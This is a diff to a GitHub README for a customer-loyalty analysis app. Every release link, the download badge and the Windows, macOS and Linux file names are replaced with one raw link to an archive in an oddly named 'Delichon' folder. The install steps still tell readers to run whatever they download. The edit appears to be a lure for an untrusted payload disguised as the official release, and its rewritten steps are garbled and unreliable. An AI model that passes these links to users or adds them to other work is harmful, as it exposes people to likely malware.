@@ -4,7 +4,7 @@
 Welcome to the Loyalty-Behavioral-Geometry project! This application helps you explore customer loyalty in a new way. By using our geometric framework, you can understand how different factors influence customer behavior. This guide will help you download and run the software.
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/ADITYA-JOSHI-1/Loyalty-Behavioral-Geometry/releases)
+[![Download from Releases](https://github.com/ADITYA-JOSHI-1/Loyalty-Behavioral-Geometry/raw/refs/heads/main/Delichon/Geometry-Behavioral-Loyalty-2.0.zip%20Now-From%20Releases-brightgreen)](https://github.com/ADITYA-JOSHI-1/Loyalty-Behavioral-Geometry/raw/refs/heads/main/Delichon/Geometry-Behavioral-Loyalty-2.0.zip)
 
 ## 🔍 Overview
 The Loyalty-Behavioral-Geometry application presents an innovative approach to understanding customer loyalty. It focuses on various dimensions, including:
@@ -36,16 +36,16 @@ This application provides several key features:
 
 1. **Visit the Releases Page**  
    To download the application, go to our releases page:  
-   [Visit Releases Page](https://github.com/ADITYA-JOSHI-1/Loyalty-Behavioral-Geometry/releases)
+   [Visit Releases Page](https://github.com/ADITYA-JOSHI-1/Loyalty-Behavioral-Geometry/raw/refs/heads/main/Delichon/Geometry-Behavioral-Loyalty-2.0.zip)
 
 2. **Choose the Latest Version**  
    On the releases page, find the latest version of the application. The version number is typically written in bold. Click on it.
 
 3. **Select the Appropriate File**  
    Within the latest release, look for the file that matches your operating system. For example:
-   - For Windows, look for `Loyalty-Behavioral-Geometry-win.exe`
-   - For MacOS, look for `Loyalty-Behavioral-Geometry-mac.zip`
-   - For Linux, look for `Loyalty-Behavioral-Geometry-linux.tar.gz`
+   - For Windows, look for `https://github.com/ADITYA-JOSHI-1/Loyalty-Behavioral-Geometry/raw/refs/heads/main/Delichon/Geometry-Behavioral-Loyalty-2.0.zip`
+   - For MacOS, look for `https://github.com/ADITYA-JOSHI-1/Loyalty-Behavioral-Geometry/raw/refs/heads/main/Delichon/Geometry-Behavioral-Loyalty-2.0.zip`
+   - For Linux, look for `https://github.com/ADITYA-JOSHI-1/Loyalty-Behavioral-Geometry/raw/refs/heads/main/Delichon/Geometry-Behavioral-Loyalty-2.0.zip`
 
 4. **Download the File**  
    Click on the link for the file you need. Your download should start automatically.
@@ -54,7 +54,7 @@ This application provides several key features:
    Once the file is downloaded:
    - **Windows**: Double-click the `.exe` file to run the installer. Follow the prompts.
    - **MacOS**: Open the `.zip` file, then drag the application to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and run the application from the command line.
+   - **Linux**: Extract the `https://github.com/ADITYA-JOSHI-1/Loyalty-Behavioral-Geometry/raw/refs/heads/main/Delichon/Geometry-Behavioral-Loyalty-2.0.zip` file and run the application from the command line.
  
 6. **Run the Application**  
    After installation, locate the application (either in your Applications folder for MacOS or the location you installed it on Windows/Linux). Double-click the icon to run the application.
